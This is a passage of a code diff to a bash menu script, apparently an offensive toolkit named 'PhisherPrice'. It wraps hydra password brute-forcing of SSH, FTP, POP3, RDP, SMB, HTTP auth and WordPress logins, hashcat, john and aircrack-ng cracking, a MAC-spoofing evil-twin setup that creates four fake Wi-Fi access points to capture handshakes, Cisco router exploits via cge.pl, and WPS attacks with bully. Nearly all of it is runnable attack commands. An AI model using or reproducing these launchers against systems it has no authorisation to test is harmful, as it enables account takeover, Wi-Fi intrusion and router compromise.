+output=$(hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh 2>&1)
 
-read
+if echo "$output" | grep -q "1 valid password found"; then
+  password=$(echo "$output" | grep "login:" | awk '{print $NF}')
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo "Password: $password"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$hynull5" ]; then                    #hynull-Option-5
 clear
-echo -e '\e[1;33m
-  _________ _________ ___ ___  
- /   _____//   _____//   |   \ 
- \_____  \ \_____  \/    ~    \
- /        \/        \    Y    /
-/_______  /_______  /\___|_  / 
-        \/        \/       \/ Brute Force \e[1;34m
-'
-echo "Enter Your Known User"
-read hydrauser3
-echo "Enter The Password List Location:"
-read hydrapasslist3
-echo "Enter The IP Address"
-read hydraip3
+echo -e "\nFTP Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter Known User:"
+read hydrauser
+echo "Enter Password List Location:"
+read hydrapasslist
+echo "Enter the IP Address:"
+read hydraip
 
-hydra $hydraip3 -s 22 ssh -l $hydrauser3 -P $hydrapasslist3
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)
 
-read
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$HYDRAWPAUTOBRUTE" ]; then                    #hynull-Option-9
 clear
 echo "Hydra WP Auto Brute"
-echo "Url (ex:target.com) : http://" 
+echo "Enter target URL (e.g. target.com):"
 read url
-echo "Path (ex:/wp-login.php) : " 
+echo "Enter path to login page (e.g. /wp-login.php):"
 read path
-echo "User (ex:admin or /path/wordlist.txt) : " 
+echo "Enter username or path to wordlist:"
 read user
-echo "Pass (ex:12345 or /path/wordlist.txt) : " 
+echo "Enter password or path to wordlist:"
 read pass
-echo "Bad Login (ex:wrong) : " 
+echo "Enter a string that appears on a failed login page:"
 read bad
-echo "Parameter (ex:username=^USER^&password=^PASS^) : " 
+echo "Enter POST parameter string (e.g. 'log=^USER^&pwd=^PASS^'):"
 read parameter
-sleep 1
-echo "[+] Execute : http://$url/$path"
-sleep 0.5
-echo "[+] User : $user"
-sleep 0.5
-echo "[+] Pass : $pass"
-sleep 0.5
-echo "[+] Bad Login : $bad"
-sleep 0.5
-echo "[+] Parameter : $parameter"
-sleep 0.5
-hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass
 
-read
+clear
+echo -e "\n-------------------------------------------"
+echo "Executing the following command:"
+echo "hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass"
+echo "Target URL: http://$url/$path"
+echo "Username: $user"
+echo "Password: $pass"
+echo "Failed login string: $bad"
+echo "POST parameter string: $parameter"
+echo -e "-------------------------------------------"
+
+echo "Running hydra..."
+output=$(hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+
+# Prompt user to continue
+read -p "Press enter to continue."
 
 elif [ "$x" == "$hynull6" ]; then                    #hynull-Option-6
 clear
@@ -1003,17 +1210,32 @@ ______   ____ ______\_____  \
 |   __/ \____/|   __/______  /
 |__|          |__|         \/ Brute Force \e[1;34m
 '
-echo "Enter Your Known User Or UserList"
-read hydrauser4
-echo "Enter The Password List Location:"
-read hydrapasslist4
-echo "Enter The IP Address"
-read hydraip4
+echo "POP3 Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter Known User or User List:"
+read hydrauser
+echo "Enter Password List Location:"
+read hydrapasslist
+echo "Enter IP Address:"
+read hydraip
 
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -l $hydrauser -P $hydrapasslist -f $hydraip pop3 -V 2>&1)
 
-hydra -l $hydrauser4 -P $hydrapasslist4 -f $hydraip4 pop3 -V
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo "Password found: $(echo "$output" | grep -oP '(?<=password: )\S+')"
+  echo -e "-------------------------------------------"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
 
-read
+read -p "Press enter to continue."
 
 elif [ "$x" == "$hynull7" ]; then                    #hynull-Option-7
 clear
@@ -1025,18 +1247,34 @@ echo -e '\e[1;33m
 \____   |  \_____  /___|
      |__|        \/ Brute Force \e[1;34m
 '
-echo "Enter Your Known User Or UserList"
-read hydrauser5
-echo "Enter The Password List Location:"
-read hydrapasslist5
-echo "Enter The IP Address"
-read hydraip5
-echo "enter the 401 Login"
+echo "HTTP Basic Authentication Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter User List Location:"
+read hydrauser
+echo "Enter Password List Location:"
+read hydrapasslist
+echo "Enter IP Address:"
+read hydraip
+echo "Enter the 401 Login Realm"
 read hyhost
 
-hydra -L $hydrauser5 -P $hydrapasslist5 $hydraip5 http-get /$hyhost
+echo -e "\n-------------------------------------------"
+echo "Running Hydra..."
+output=$(hydra -L $hydrauser -P $hydrapasslist $hydraip http-get /$hyhost 2>&1)
 
-read
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+  echo "Password: $(echo "$output" | grep -oP '(?<=login:\s).*$')"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$hynull8" ]; then                    #hynull-Option-8
 clear
@@ -1048,16 +1286,38 @@ __________________ __________
  |____|_  /_______  /____|    
         \/        \/ Brute Force \e[1;34m
 '
-echo "Enter Your Known User Or UserList"
+echo "RDP Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter the username or username list file path:"
 read hydrauser8
-echo "Enter The Password List Location:"
+
+echo "Enter the password list file path:"
 read hydrapasslist8
-echo "Enter The IP Address"
+
+echo "Enter the target IP address:"
 read hydraip8
 
-hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8
+if [ -f "$hydrauser8" ]; then
+  hydrauser8="-M $hydrauser8"
+fi
 
-read
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8 2>&1)
+
+if echo "$output" | grep -q "1 valid password found"; then
+  password=$(echo "$output" | grep -o "Password:.*" | cut -d' ' -f2-)
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo "Password: $password"
+  echo -e "-------------------------------------------"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
+read -p "Press enter to continue."
 
 elif [ "$x" == "$newoption1" ]; then                    #hynull-Option-9
 clear
@@ -1069,17 +1329,30 @@ echo -e '\e[1;33m
 /_______  /\____|__  /______  /
         \/         \/       \/ Brute Force \e[1;34m
 '
-echo "Enter Your Known User Or UserList"
-read hydrauser9
-echo "Enter The Password List Location:"
-read hydrapasslist9
-echo "Enter The IP Address"
-read hydraip9
+echo "SMB Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter Known User or User List:"
+read hydrauser
+echo "Enter Password List Location:"
+read hydrapasslist
+echo "Enter the IP Address:"
+read hydraip
 
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -t 1 -V -f -l $hydrauser -P $hydrapasslist $hydraip smb 2>&1)
 
-hydra -t 1 -V -f -l $hydrauser9 -P $hydrapasslist9 $hydraip9 smb
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
 
-read
+read -p "Press enter to continue."
 
 else 
 
@@ -1088,39 +1361,60 @@ n
 
 fi
 
-elif [ "$x" == "$subg" ]; then                    #Sub-Option-g
-echo "enter your wordlist eg :/usr/share/john/password.lst"
-read jwords
-echo "Enter File Location eg: /usr/john/Documents/unshadowed.txt"
-read $jfiles
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!Gathering Information About Host!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+elif [ "$x" == "$subg" ]; then                    #jhon
+clear
 
-john --wordlist=$jwords --rules $jfiles
+echo -e "\nPassword Cracking Script Using John the Ripper"
+echo -e "-------------------------------------------\n"
+echo "Enter the path to your wordlist (e.g. /usr/share/john/password.lst): " 
+read wordlist
+echo "Enter the path to the file to crack (e.g. /usr/john/Documents/unshadowed.txt): " 
+read file
 
-read
+if ! [ -f "$wordlist" ]; then
+    clear
+    echo "Error: The wordlist file doesn't exist or is inaccessible."
+    read -p "Press Enter to continue." 
+fi
+
+if ! [ -f "$file" ]; then
+    clear
+    echo "Error: The file to crack doesn't exist or is inaccessible."
+    read -p "Press Enter to continue." 
+fi
+
+echo -e "\n-------------------------------------------"
+echo "Starting cracking process..."
+echo -e "-------------------------------------------\n"
+
+read -p "Enter the mode of attack (wordlist, mask, hybrid): " mode
+read -p "Enter the number of CPU cores to use (1-8): " cores
+
+john --wordlist="$wordlist" --rules --format=NT --session=john --fork="$cores" --progress="$mode" "$file"
+
+echo -e "\n-------------------------------------------"
+echo "Cracking process complete!"
+echo -e "-------------------------------------------\n"
+
+read -p "Press Enter to continue." 
 
 elif [ "$x" == "$subh" ]; then                    #Sub-Option-h
 clear
+echo -e "\nHash Identifier"
+echo -e "-------------------------------------------\n"
 echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!     CTRL + C TO QUIT         !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+-------------------------------------------
+|           CTRL + C TO QUIT              |
+-------------------------------------------
+ '
 hash-identifier
-
 echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!           Good Bye               !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
+-------------------------------------------
+|               Good Bye                  |
+-------------------------------------------
 '
 
-read
+read -p "Press Enter to continue." 
 
 elif [ "$x" == "$subi" ]; then                    #Sub-Option-i
 clear
@@ -1132,23 +1426,46 @@ echo -e '\e[1;33m
  \___|_  /(____  /____  >___|  /\___  >____  /__|  
        \/      \/     \/     \/     \/     \/      \e[1;34m
 '
-echo "Enter Hash Type: 500 = md5crypt"
+echo -e "\nHashcat Password Cracking Script"
+echo -e "-------------------------------------------\n"
+
+# Prompt user for input
+echo "Enter Hash Type (500 = md5crypt): " 
 read encmode
-echo "Enter Hash Hocation eg: /usr/share/me/example500.hash"
+echo "Enter Hash Location (e.g. /usr/share/me/example500.hash): " 
 read hashtype
-echo "Enter Wordlist Location eg: /usr/share/wordlists/sqlmap.txt"
-read hashpass1
+echo "Enter Wordlist Location (e.g. /usr/share/wordlists/sqlmap.txt): " 
+read wordlist
+
+# Check if the specified files exist
+if ! [[ -f $hashtype ]]; then
+  echo "Error: Hash file not found."
+  read -p "Press Enter to continue." 
+fi
+
+if ! [[ -f $wordlist ]]; then
+  echo "Error: Wordlist file not found."
+  read -p "Press Enter to continue." 
+fi
+
 clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!  Attempting to Crack Hash Type   !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+  echo -e "\n-------------------------------------------"
+  echo "Attempting to Crack Hash Type."
+  echo -e "-------------------------------------------\n"
 
-hashcat -m $encmode $hashtype $hashpass1
+hashcat -m $encmode $hashtype $wordlist
 
-read
+if [[ $? -eq 0 ]]; then
+  echo -e "\n-------------------------------------------"
+  echo "Password successfully cracked!"
+  echo -e "-------------------------------------------\n"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Password not found in the wordlist."
+  echo -e "-------------------------------------------\n"
+fi
+
+read -p "Press Enter to continue." 
 
 elif [ "$x" == "$subj" ]; then                    #Sub-Option-j
 clear
@@ -1160,60 +1477,69 @@ echo -e '\e[1;33m
 \____|__  /__||__|    \___  >__|  (____  /\___  >__|_ \         |___|  /\___  / 
         \/                \/           \/     \/     \/              \//_____/  \e[1;34m
 '
-echo "Enter Password List Location"
+echo -e "\nAircrack-ng WPA Password Cracking Script"
+echo -e "-------------------------------------------\n"
+
+echo "Enter the location of the password list: "
 read wifirip
-echo "Enter filename.cap location"
+echo "Enter the location of the capture file (.cap): "
 read subopi
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!   Attempting to Crack WPA    !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
-aircrack-ng -w $wifirip $subopi
+if ! [[ -f "$wifirip" ]]; then
+  echo "Error: Password list file not found."
+  read -p "Press Enter to continue."
+fi
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!         DID WE DO IT ?            !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+if ! [[ -f "$subopi" ]]; then
+  echo "Error: Capture file not found."
+  read -p "Press Enter to continue."
+fi
 
-read
+clear
+echo -e "\n-------------------------------------------"
+echo "Attempting to crack WPA..."
+echo -e "-------------------------------------------\n"
+
+aircrack-ng -w "$wifirip" "$subopi"
+
+if [[ $? -eq 0 ]]; then
+  echo -e "\n-------------------------------------------"
+  echo "Password successfully cracked!"
+  echo -e "-------------------------------------------\n"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Password not found in the password list."
+  echo -e "-------------------------------------------\n"
+fi
+  read -p "Press Enter to continue."
 
 elif [ "$x" == "$subk" ]; then                    #Sub-Option-k
 clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!         Launching SQLdict         !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+echo -e "\nLaunching SQLdict"
+echo -e "-------------------------------------------\n"
+
+echo -e "Launching SQLdict...\n"
 
 sqldict
 
-read
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$honeywhy" ]; then                    #hynull-Option-9
-# Get wireless interface
 echo -n "Enter wireless interface (e.g. wlan1 or wlan0): "
 read iface
 
-# Put wireless interface into monitor mode
 echo "Putting wireless interface into monitor mode..."
 ip link set dev $iface down
 macchanger -r $iface
 ip link set dev $iface up
 airmon-ng start $iface
 
-# Get target ESSID and channel
 echo -n "Enter target ESSID: "
 read essid
 echo -n "Enter target channel: "
 read ch
 
-# Create four fake access points
 echo "Creating four fake access points with name $essid..."
 xterm -hold -e "airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon0" &
 pid1=$!
@@ -1224,17 +1550,14 @@ pid3=$!
 xterm -hold -e "airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon0 -W 1 -Z 4" &
 pid4=$!
 
-# Capture and save handshake
 echo -n "Enter a name for the output file: "
 read fname
 xterm -hold -e "airodump-ng --channel $ch --write $fname mon0" &
 pid5=$!
 
-# Attempt to crack the password
 echo "Attempting to crack password using a strong dictionary..."
 aircrack-ng -w /path/to/dictionary.txt $fname-01.cap
 
-# Cleanup
 echo "Cleaning up..."
 kill $pid1 $pid2 $pid3 $pid4 $pid5
 airmon-ng stop mon0
@@ -1908,24 +2231,22 @@ echo -e '\e[1;33m
 /_______  /|__|  \___  >____  /____/__| |___|  / \____|__  /__|  |   __/ 
         \/           \/     \/               \/          \/      |__|    \e[1;34m
 '
-echo "Example IP Usage: 192.168.9.99 "
-echo "Enter Ip:"
+echo -e "\nNetwork Scanning with arp-scan"
+echo -e "-------------------------------------------\n"
+
+echo "Example IP Usage: 192.168.9.99"
+echo "Enter the IP address to scan: " 
 read subopa
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-! Scanning The Network Like A NINJA :D !
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
 
-arp-scan -l -s $subopa -v
+echo -e "\nStarting network scan...\n"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!    We Escaped Undetected :D      !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+if arp-scan -l -s $subopa -v; then
+    echo -e "\nNetwork scan complete.\n"
+else
+    echo -e "\nNetwork scan failed.\n"
+fi
 
-read
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$subb" ]; then                    #Sub-Option-b
 clear
@@ -1937,16 +2258,19 @@ echo -e '\e[1;33m
 \____|__  /____|_  /|____|     /_______  /___|  /__||__|   |__|  \___  >__|   
         \/       \/                    \/     \/                     \/       \e[1;34m
 '
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!Gathering Information About Host!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+echo -e "\nHost Information Gathering with netdiscover"
+echo -e "-------------------------------------------\n"
+
+echo -e "Starting information gathering...\n"
+
 clear
+if netdiscover -p; then
+  echo -e "\nInformation gathering complete.\n"
+else
+  echo -e "\nInformation gathering failed.\n"
+fi
 
-netdiscover -p
-
-read
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$subc" ]; then                    #Sub-Option-c
 clear
@@ -1966,8 +2290,8 @@ cisco2='2'
 
 
 wait
-echo -e $BlueF" ┌─["$red"PhisherPrice$BlueF]──[$red~$BlueF]─["$yellow"Cisco Routers$BlueF]:"
-echo -e $BlueF" └─────► " ;read -p " CHOOSE: " x
+echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
+echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
 
 if [ "$x" == "$cisco1" ]; then                    #cisco-Option-1
 clear
@@ -1979,9 +2303,15 @@ _________   ________  ___________              .__         .__  __
  \______  /\______  / /_______  /__/\_ \|   __/|____/\____/|__||__|  
         \/        \/          \/      \/|__|                         \e[1;34m
 '  
-echo "Enter Targets IP For EG: "
-read ciscooip2
-echo -e '
+function validate_input {
+    if ! [[ "$1" =~ ^[1-9][0-9]*$ && "$1" -le 14 ]]; then
+        echo "Invalid option selected. Please select a number between 1 and 14."
+        exit 1
+    fi
+}
+echo "Enter target IP address:"
+read target_ip
+cat <<EOF
 [1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability
 [2] - Cisco IOS Router Denial of Service Vulnerability
 [3] - Cisco IOS HTTP Auth Vulnerability
@@ -1996,31 +2326,57 @@ echo -e '
 [12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability
 [13] - 0 Encoding IDS Bypass Vulnerability (UTF)
 [14] - Cisco IOS HTTP Denial of Service Vulnerability
-'
-echo "Please Slect An Option For eg: 1 or 6"
+EOF
 
-read C
-echo "Dou You Have A Password List?"
-echo "If So Type: -a Then The Location Of Your List Otherwise PRESS ENTER"
-read passlist
-echo "Dou You Have A User's List For Name Guessing?"
-echo "If So Type: -w Then The Location Of Your List Otherwise PRESS ENTER"
-read userlist
-echo "Dou You Want To Check For IOS History Bug?"
-echo "If So Type: -i Otherwise PRESS ENTER"
-read ioscheck
+echo "Please select a vulnerability to exploit (1-14):"
+read vulnerability
+validate_input $vulnerability
+
+echo "Do you have a password list? (y/n)"
+read -r has_password_list
+if [[ $has_password_list == "y" ]]; then
+    echo "Please enter the location of your password list:"
+    read password_list
+    password_option="-a $password_list"
+fi
+
+echo "Do you have a user's list for name guessing? (y/n)"
+read -r has_user_list
+if [[ $has_user_list == "y" ]]; then
+    echo "Please enter the location of your user list:"
+    read user_list
+    user_option="-w $user_list"
+fi
+
+echo "Do you want to check for IOS history bug? (y/n)"
+read -r has_ios_history_bug
+if [[ $has_ios_history_bug == "y" ]]; then
+    ios_option="-i"
+fi
 clear
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!     Trying To PWN Router :D      !!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 '
-cge.pl $ciscooip2 $C $ioscheck $passlist $userlist
+cge.pl "$target_ip" "$vulnerability" "$ios_option" "$password_option" "$user_option"
 
 read
 
 elif [ "$x" == "$cisco2" ]; then                    #cisco-Option-2
 clear
+check_ios_history() {
+    if [ "$ioscheck" == "-i" ]; then
+        echo "Checking for IOS history bug..."
+    fi
+}
+
+guess_usernames() {
+    if [ "$userlist" != "" ]; then
+        echo "Guessing usernames..."
+    fi
+}
+
 echo -e '\e[1;33m
 _________     ________________
 \_   ___ \   /  _  \__    ___/
@@ -2029,31 +2385,57 @@ _________     ________________
  \______  /\____|__  /____|   
         \/         \/         \e[1;34m
 '  
-echo Cisco Auditing Tool
+echo "Cisco Auditing Tool"
 
-echo "Enter The IP eg: 192.168.1.202"
-read cauditip
-echo "Type The Port You Want To Test ( 23 ) is Default"
-read cauditport
-echo "Dou You Have A Password List?"
-echo "If So Type: -a space Then The Location Of Your List Otherwise PRESS ENTER"
-echo "For Default"
-read cauditpasslist
-echo "Dou You Have A User's List For Name Guessing?"
-echo "If So Type: -w space Then The Location Of Your List Otherwise PRESS ENTER"
-read userlist2
-echo "Dou You Want To Check For IOS History Bug?"
-echo "If So Type: -i Otherwise PRESS ENTER"
-read ioscheck2
-clear
-echo -e '
+echo "Enter the target IP address (e.g. 192.168.1.202): "
+read target_ip
+
+echo "Type the port you want to test (default is 23): "
+read port_number
+if [[ -z "$port_number" ]]; then
+    port_number=23
+fi
+
+echo "Do you have a password list? (y/n): "
+read password_list_option
+if [[ "$password_list_option" == "y" ]]; then
+    echo "Enter the location of your password list: "
+    read password_list_location
+    if [[ ! -f "$password_list_location" ]]; then
+        echo "Password list file not found. Exiting..."
+        exit 1
+    fi
+    password_list="-a $password_list_location"
+fi
+
+echo "Do you have a username list for guessing? (y/n): "
+read username_list_option
+if [[ "$username_list_option" == "y" ]]; then
+    echo "Enter the location of your username list: "
+    read username_list_location
+    if [[ ! -f "$username_list_location" ]]; then
+        echo "Username list file not found. Exiting..."
+        exit 1
+    fi
+    userlist="-w $username_list_location"
+fi
+
+echo "Do you want to check for IOS history bug? (y/n): "
+read ios_history_option
+if [[ "$ios_history_option" == "y" ]]; then
+    ioscheck="-i"
+fi
+
+echo -e "
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!       Auditing The Host        !!!!
+!!!!       Auditing the host        !!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+"
 
+CAT -h "$target_ip" -p "$port_number" "$password_list" "$ioscheck" "$userlist"
 
-CAT -h $cauditip -p $cauditport $cauditpasslist $ioscheck2 $userlist2
+guess_usernames
+check_ios_history
 
 read
 
@@ -2074,219 +2456,249 @@ echo -e '\e[1;33m
 \____|__  (____  /____  >_______  /\___  >____  /___|  /
         \/     \/     \/        \/     \/     \/     \/ \e[1;34m
 '  
-echo -e '
-Scan For Open Ports On Networks
-'
-
-echo "Enter IP For eg: 192.168.1.0"
+echo -e "\nNetwork Port Scanner with Masscan"
+echo -e "---------------------------------\n"
+echo "Enter IP (e.g. 192.168.1.0):"
 read massip
-echo "Enter The Range For eg: 24 or 80"
+echo "Enter Port Range (e.g. 24 or 80):"
 read massrange
+
 clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!   Press Ctrl + C To Stop     !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
- masscan -p22,21,80,445,443 $massip/$massrange
+echo -e "Starting port scan...\n"
 
-read
+if masscan -p22,21,80,445,443 $massip/$massrange; then
+  echo -e "\nPort scan complete.\n"
+else
+  clear
+  echo -e "\nPort scan failed.\n"
+fi
+
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$sube" ]; then                    #Sub-Option-e
 clear
-echo -e '\e[1;33m
- __      __.__  _____.__  __          
-/  \    /  \__|/ ____\__|/  |_  ____  
-\   \/\/   /  \   __\|  \   __\/ __ \ 
- \        /|  ||  |  |  ||  | \  ___/ 
-  \__/\  / |__||__|  |__||__|  \___  >
-       \/                          \/ \e[1;34m
-'  
-echo "Are You Sure You Want To Start WIFITE ?"
-echo "Press ENTER For YES Any Other Option To Return"
-read wifiwanger
-clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!!!    Starting Wifite         !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+echo -e "\n**************************************************"
+echo "******     Wifite Launcher     ******"
+echo -e "**************************************************\n"
 
-$wifiwanger wifite --kill-all
+read -p "Are you sure you want to start Wifite? (y/n): " wifiwanger
 
-read
+if [[ $wifiwanger =~ ^[Yy]$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Starting Wifite     ******"
+  echo -e "**************************************************\n"
+  
+  wifite --kill-all
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$yersin" ]; then                    #Sub-Option-e
 clear
-echo -e '\e[1;33m
-_____.___.                   .__       .__        
-\__  |   | ___________  _____|__| ____ |__|____   
- /   |   |/ __ \_  __ \/  ___/  |/    \|  \__  \  
- \____   \  ___/|  | \/\___ \|  |   |  \  |/ __ \_
- / ______|\___  >__|  /____  >__|___|  /__(____  /
- \/           \/           \/        \/        \/ \e[1;34m
-'
-echo "Are You Sure You Want To Start Yersinia ?"
-echo "Press ENTER For YES Any Other Option To Return"
-read siryessir
-clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!!!    Starting Yersinia       !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+echo -e "\n**************************************************"
+echo "******     Yersinia Launcher     ******"
+echo -e "**************************************************\n"
 
-$siryessir yersinia -G
+read -p "Are you sure you want to start Yersinia? (y/n): " siryessir
 
-read
+if [[ $siryessir =~ ^[Yy]$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Starting Yersinia     ******"
+  echo -e "**************************************************\n"
+
+  yersinia -G
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+
+read -p "Press Enter to continue."
 
 elif [ "$x" == "$bully" ]; then                    #YouLilBully
 clear
-echo -e '\e[1;33m
-__________      .__  .__          __________       .__ 
-\______   \__ __|  | |  | ___.__. \______   \ ____ |__|
- |    |  _/  |  \  | |  |<   |  |  |    |  _//  _ \|  |
- |    |   \  |  /  |_|  |_\___  |  |    |   (  <_> )  |
- |______  /____/|____/____/ ____|  |______  /\____/|__|
-        \/                \/              \/           \e[1;34m
-'  
-echo "Are You Sure You Want To Bully someones network ?"
-echo " I NEED THE ESSID FIRST IT LOOKS LIKE THIS : 6F36E6"
-read bullyboy
-echo "Witch Device Are You Using? wlan0mon Or wlan1mon ?"
-read boibully
+echo -e "\n**************************************************"
+echo "******     Wi-Fi Bully     ******"
+echo -e "**************************************************\n"
+
+read -p "Enter the ESSID of the network you want to bully (e.g. 6F36E6): " essid
+if [[ ! $essid =~ ^[a-fA-F0-9]{6}$ ]]; then
+  echo -e "\nInvalid ESSID. Please enter a valid 6-character hexadecimal string."
+  read -p "Press Enter to continue."
+fi
+
+read -p "Which Wi-Fi interface are you using? (wlan0mon/wlan1mon): " interface
+if [[ ! $interface =~ ^(wlan0mon|wlan1mon)$ ]]; then
+  echo -e "\nInvalid interface name. Please enter either wlan0mon or wlan1mon."
+  read -p "Press Enter to continue."
+fi
+
+read -p "Are you sure you want to bully network with ESSID $essid using interface $interface? (y/n): " confirm
+if [[ ! $confirm =~ ^[Yy]$ ]]; then
+  echo -e "\nOperation cancelled."
+  read -p "Press Enter to continue."
+fi
+
 clear
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!!!     YOU BIG BULLY          !!!!!
-!!!!!!!     POOR NETWORK :(        !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+echo -e "\n**************************************************"
+echo "******     Starting Bully     ******"
+echo -e "**************************************************\n"
+bully -e $essid $interface
 
-bully -e $bullyboi $boibully
+if [[ $? -ne 0 ]]; then
+  clear
+  echo -e "\nBully failed. Please make sure you have the necessary tools installed and try again."
+  read -p "Press Enter to continue."
+fi
 
